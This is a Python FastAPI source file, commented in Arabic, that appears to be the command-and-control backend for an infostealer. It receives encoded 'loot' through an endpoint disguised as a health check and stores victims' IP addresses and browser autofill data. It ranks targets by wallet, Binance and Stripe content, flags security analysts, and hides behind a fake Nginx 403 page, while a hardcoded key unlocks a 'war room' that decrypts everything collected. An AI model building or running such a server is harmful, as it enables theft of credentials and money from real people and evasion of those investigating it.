from fastapi import FastAPI, Request, HTTPException, Response, Query, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from psycopg2.extras import RealDictCursor
import psycopg2
import os, json, base64, datetime, hashlib, logging

app = FastAPI(docs_url=None, redoc_url=None) # تخفي الواجهة تماماً

# --- إعدادات التحكم المطلق ---
DB_URL = os.environ.get("DATABASE_URL")
MASTER_KEY = "Morteza_Overlord_2026"

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=True,
    allow_methods=["*"], 
    allow_headers=["*"],
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("SOVEREIGN_OMEGA")

# --- 1. محرك التشفير المزدوج (XOR Cipher) ---
def xor_cipher(data: str):
    key = MASTER_KEY
    return "".join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data)])

# --- 2. محرك التصنيف الاستخباراتي ---
class SovereignAI:
    @staticmethod
    def evaluate_target(data):
        score = 0
        loot = data.get('loot', {})
        sec = data.get('sec', {})
        vault = data.get('vault', {})
        
        if sec.get('dbg'): score -= 200 # كشف المحللين
        if vault and len(vault) > 0: score += 300 # صيدة أوتوفيل ثمينة
        if any(x in json.dumps(loot).lower() for x in ['binance', 'wallet', 'stripe']): score += 250
        
        if score > 150: return "HIGH_VALUE_TARGET"
        if score < 0: return "SUSPICIOUS_ANALYZER"
        return "NORMAL_USER"

# --- 3. إدارة الداتا بيس ---
def get_db_conn():
    return psycopg2.connect(DB_URL, sslmode='require')

@app.on_event("startup")
def boot_system():
    conn = get_db_conn()
    cur = conn.cursor()
    # دمجنا الـ Create مع الـ Alter لضمان عدم وجود أخطاء في التشغيل الأول
    cur.execute("""
        CREATE TABLE IF NOT EXISTS sovereign_omega_loot (
            id SERIAL PRIMARY KEY,
            target_id TEXT,
            gift_tag TEXT,
            ip_address TEXT,
            encrypted_loot TEXT,
            vault_data TEXT,
            target_class TEXT,
            metadata JSONB,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        ALTER TABLE sovereign_omega_loot ADD COLUMN IF NOT EXISTS vault_data TEXT;
    """)
    conn.commit()
    cur.close()
    conn.close()
    logger.info("✅ System Booted: Schema Verified")

# --- 4. محرك المعالجة الخلفية (The Black Box) ---
def process_incoming_loot(raw_bytes: bytes, ip: str):
    try:
        # 1. تنظيف وفك Base64
        raw_str = raw_bytes.decode('utf-8', errors='ignore').strip().replace(' ', '+')
        missing_padding = len(raw_str) % 4
        if missing_padding: raw_str += '=' * (4 - missing_padding)
        
        try:
            decoded_data = base64.b64decode(raw_str).decode('utf-8')
        except:
            # محاولة التحويل لـ URL-safe إذا فشل العادي
            raw_str = raw_str.replace('-', '+').replace('_', '/')
            decoded_data = base64.b64decode(raw_str).decode('utf-8')

        # 2. محاولة قراءة الـ JSON (سواء كان XOR أو عادي)
        try:
            data = json.loads(decoded_data)
        except:
            data = json.loads(xor_cipher(decoded_data))

        # --- [ الحل هنا ] استخراج المتغيرات قبل الاستخدام في الـ SQL ---
        tid = data.get("tid", f"SOV-{hashlib.md5(raw_bytes).hexdigest()[:6].upper()}")
        tag = data.get("tag", "no_tag")
        vault = data.get("vault", {})
        target_class = SovereignAI.evaluate_target(data)
        
        # 3. التخزين (حفظ النسخة الخام والـ Vault)
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO sovereign_omega_loot 
            (target_id, gift_tag, ip_address, encrypted_loot, vault_data, target_class)
            VALUES (%s, %s, %s, %s, %s, %s)
        """, (tid, tag, ip, raw_str, json.dumps(vault), target_class))
        
        conn.commit()
        cur.close()
        conn.close()
        logger.info(f"✅ Loot Secured: {tid}")

    except Exception as e:
        logger.error(f"💀 CRITICAL_FAILURE: {str(e)}")

# --- 5. البوابات ---
@app.post("/api/v1/sys/health/sync")
async def inbound_gate(request: Request, bg: BackgroundTasks):
    print("DEBUG: RECEIVED A HIT FROM THE GIFT!")
    ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
    raw = await request.body()
    bg.add_task(process_incoming_loot, raw, ip)
    return {"status": "ok"}

@app.get("/api/v1/sys/health/report")
async def get_war_room(key: str = Query(None)):
    if key != MASTER_KEY: return Response(status_code=404)
    conn = get_db_conn()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute("SELECT * FROM sovereign_omega_loot ORDER BY created_at DESC")
    rows = cur.fetchall()
    
    for row in rows:
        try:
            # 1. فك تشفير الـ Loot الأساسي
            if row['encrypted_loot'].startswith('{'):
                row['decrypted_data'] = json.loads(row['encrypted_loot'])
            else:
                try:
                    raw_decoded = base64.b64decode(row['encrypted_loot']).decode()
                    row['decrypted_data'] = json.loads(xor_cipher(raw_decoded))
                except:
                    row['decrypted_data'] = {"raw": row['encrypted_loot']}
            
            # 2. فك تشفير الـ Vault (الأوتوفيل)
            if row['vault_data']:
                if row['vault_data'].startswith('{'):
                    row['decrypted_vault'] = json.loads(row['vault_data'])
                else:
                    try:
                        raw_v_decoded = base64.b64decode(row['vault_data']).decode()
                        row['decrypted_vault'] = json.loads(xor_cipher(raw_v_decoded))
                    except:
                        row['decrypted_vault'] = {"raw": row['vault_data']}
            else:
                row['decrypted_vault'] = {}
                
        except Exception as e:
            row['decrypted_data'] = {"error": str(e)}
            row['decrypted_vault'] = {}
            
    cur.close()
    conn.close()
    return rows

@app.get("/")
async def fake_front():
    return Response(content="<h1>403 Forbidden</h1><p>Nginx/2.4.1</p>", status_code=403)
